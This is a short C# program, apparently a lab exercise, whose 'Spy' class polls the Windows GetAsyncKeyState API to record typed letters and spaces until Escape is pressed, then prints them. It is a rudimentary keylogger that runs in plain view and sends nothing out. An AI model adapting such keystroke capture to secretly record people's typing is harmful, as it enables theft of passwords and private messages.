using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace lab4_task1
{
    class Spy
    {
        [DllImport("user32.dll", EntryPoint = "GetAsyncKeyState")]
        private static extern short GetAsyncKeyState(int vKey);

        public static bool[] isPressed = new bool[0x5A - 0x41 + 1];
        public static bool isPressedSpace = new bool();

        public static void Start(out string data)
        {
            data = string.Empty;
            while(true)
            {
                if(GetAsyncKeyState(0x1B) != 0)
                {
                    break;
                }

                for(int i = 0x41; i <= 0x5A; ++i)
                {
                    Console.WriteLine($"State: {GetAsyncKeyState(i)}");

                    if(GetAsyncKeyState(i) == 0)
                    {
                        isPressed[i - 0x41] = false;
                    }

                    if(GetAsyncKeyState(0x20) == 0)
                    {
                        isPressedSpace = false;
                    }
                    if(GetAsyncKeyState(0x20) != 0 && !isPressedSpace)
                    {
                        data += ' ';
                        isPressedSpace = true;
                    }

                    if(GetAsyncKeyState(i) != 0 && !isPressed[i - 0x41])
                    {
                        if(GetAsyncKeyState(0x10) == 0)
                        {
                            data += (char)(i - 0x41 + 97); 
                        }
                        else
                        {
                            data += (char)(i - 0x41 + 65);
                        }
                        isPressed[i - 0x41] = true;
                    }
                }
            }
        }

        public static void Main()
        {
            for(int i = 0; i < isPressed.Length; ++i)
            {
                isPressed[i] = false;
            }
            isPressedSpace = false;

            string data = string.Empty;
            Start(out data);
            Console.WriteLine($"Data: {data}");
        }
    }
}
